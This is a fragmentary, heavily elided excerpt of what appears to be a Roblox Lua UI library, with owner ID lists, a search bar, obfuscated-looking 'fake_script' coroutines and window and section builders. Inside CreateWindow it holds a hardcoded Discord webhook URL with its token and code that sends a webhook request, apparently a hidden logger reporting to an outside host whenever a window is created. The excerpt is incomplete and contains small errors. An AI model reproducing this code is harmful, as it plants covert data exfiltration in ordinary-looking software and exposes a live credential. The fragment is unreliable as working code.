...
local Owners = {2477806400,3494826637}
local CoOwners = {}
local Staff = {}
...
searchbar.PlaceholderText = "ㅤ🔍 Search.. (no work yet)"
searchbar.Text = ""
...
coroutine.wrap(HYMB_fake_script)()
  ...
  local function SXQB_fake_script() 
...
coroutine.wrap(SXQB_fake_script)()
  ...
  local function LKDRH_fake_script() 
  ...
  coroutine.wrap(LKDRH_fake_script)()
  ...
  local function VEOIDS_fake_script()
  ...
  coroutine.wrap(VEOIDS_fake_script)()
...
function lib:CreateWindow(name)
  ...
  local webhookUrl = "https://discord.com/api/webhooks/1322287456552357938/rEctQ9E1n8M2dzrPEM0BeD26vkmhL73sFzOiuFh5mxpt-Za6P-R-GyzhTSxq-tywjoGy"
      ...
      if response.StatusCode == 200 then
          ...
          print("Failed to send webhook: " .. response.StatusCode .. " - " .. response.StatusMessage)
      end
  end
  ...
  function insider:CreateSection(title, search, content)
    ...
    if search then
      ...
      searchbar.Visble = false
  end
end

  function insider:CreateSectionButton(name, callback)
